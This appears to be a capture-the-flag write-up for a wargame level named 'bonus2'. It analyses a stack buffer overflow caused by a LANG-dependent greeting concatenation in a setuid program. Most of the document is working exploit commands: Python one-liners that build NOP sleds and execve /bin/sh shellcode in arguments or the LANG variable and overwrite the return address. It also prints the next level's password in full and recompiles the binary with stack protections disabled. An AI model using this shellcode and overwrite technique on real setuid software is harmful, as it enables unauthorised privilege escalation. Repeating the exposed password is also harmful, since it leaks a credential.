# ------------------------------------------------------------------------
# analysis
# ------------------------------------------------------------------------

the main function copies the argv[1] copies 40 bytes of argv[1] string into a buffer B
and then it copies 32 bytes of argv[2] into buffer B at index 40
thus, if argv[1] length is equal to or greater than 40 characters the two strings become concatenated

afterwards, the main function checks the env variable `LANG' and sets a static variable to
either 1 if `LANG' is `fi', 2 if `LANG' is 'nl' or 0 if any other value

it then passes a copy of its buffer to function `greetuser()'

`greetuser()' concatenates string received from main with a localized "hello" greeting;

if `LANG' is either `fi' or `nl' and the parameter passed to `greetuser()' is long enough,
    the function overwrites it's own original ebp and return address


# ------------------------------------------------------------------------
# exploit
# ------------------------------------------------------------------------

shell code execution is on the stack,
because of this the return address might be different from one execution to another;

for the purpose of this informational text we'll use 0xBFFFF6A0

crafted argv[1]:    nopsled + shell code
    $(python -c "print(14*'\x90'+'\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80')") 

crafted argv[2]:    filler + ebp value + return address
    $(python -c "print('A'*14 + '\xBF\xFF\xFF\xFF'[::-1] + '\xBF\xFF\xF6\xA0'[::-1])")

all together:
    export LANG=fi; /home/user/bonus2/bonus2 $(python -c "print(14*'\x90'+'\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80')") $(python -c "print('A'*14 + '\xBF\xFF\xFF\xFF'[::-1] + '\xBF\xFF\xF6\xA0'[::-1])")

when LANG=fi, bytes[18:22] of argv[2] will be return address of greetuser()

when LANG=nl, bytes[23:27] of argv[2] will be return address of greetuser()

when you are in Helsinki, you do:
    export LANG=fi; ~/bonus2 $(python -c "print(14*'\x90'+'\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80')") $(python -c "print('A'*14 + '\xBF\xFF\xFF\xFF'[::-1] + '\xBF\xFF\xF6\xA0'[::-1])")

and when you are in Amsterdam, you do:
    export LANG=nl; ~/bonus2 $(python -c "print(14*'\x90'+'\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80')") $(python -c "print('A'*19 + '\xBF\xFF\xFF\xFF'[::-1] + '\xBF\xFF\xF6\xA0'[::-1])")


# ------------------------------------------------------------------------
# Obtain the next password (putting shellcode in env variable LANG)
# ------------------------------------------------------------------------

# We can overwrite the function greetuser()'s return address, located at buf[76]
# We can include the NOP + shellcode in env variable LANG.

# getenv() returns the address 0xbffffd72
# crafted return address = 0xbffffd72 + 2 + 200 = 0xbffffe3c

# In Amsterdam (LANG == "nl"):

    argv[0] = AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  ("A" * 40)
    argv[1] = BBBBBBBBBBBBBBBBBBBBBBBXXXX               ("B" * 23 + RET_ADDR)

    buf:
    ( 13 bytes Dutch greeting )( 40 bytes )( 23 bytes )( 4 bytes RET_ADDR )

    # Set LANG with shellcode
    export LANG=`python -c "print('nl' + '\x90' * 400 + '\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80')"`

    # Run the program
    ~/bonus2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA `python -c "print('BBBBBBBBBBBBBBBBBBBBBBB' + '\xbf\xff\xfe\x3c'[::-1])"`

# In Helsinki (LANG == "fi"):

    argv[0] = AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  ("A" * 40)
    argv[1] = BBBBBBBBBBBBBBBBBBXXXX                    ("B" * 18 + RET_ADDR)

    buf:
    ( 18 bytes Finnish greeting )( 40 bytes )( 18 bytes )( 4 bytes RET_ADDR )

    # Set LANG with shellcode
    export LANG=`python -c "print('fi' + '\x90' * 400 + '\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80')"`

    # Run the program
    ~/bonus2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA `python -c "print('BBBBBBBBBBBBBBBBBB' + '\xbf\xff\xfe\x3c'[::-1])"`

whoami
cat /home/user/bonus3/.pass

# Now we can log in as user bonus3
su bonus3
# password: 71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587



# ------------------------------------------------------------------------
# Recreate the exploitable program
# ------------------------------------------------------------------------

# As user bonus3:

    # Compile the program in /tmp
    gcc bonus2.c -fno-stack-protector -z execstack -o ft_bonus2

    # Edit suid
    chmod u+s ft_bonus2

    # Move the program to home directory
    chmod +wx ~; mv ft_bonus2 ~

# As user bonus2:
    
    # getenv() returns the address 0xbffffd7c
    # crafted return address = 0xbffffd7c + 2 + 200 = 0xbffffe46

    # LANG='nl'

        export LANG=`python -c "print('nl' + '\x90' * 400 + '\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80')"`

        # Run the program
        ./ft_bonus2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA `python -c "print('BBBBBBBBBBBBBBBBBBBBBBB' + '\xbf\xff\xfe\x46'[::-1])"`

    # LANG='fi'

        export LANG=`python -c "print('fi' + '\x90' * 400 + '\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80')"`

        # Run the program
        ~/bonus2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA `python -c "print('BBBBBBBBBBBBBBBBBB' + '\xbf\xff\xfe\x46'[::-1])"`




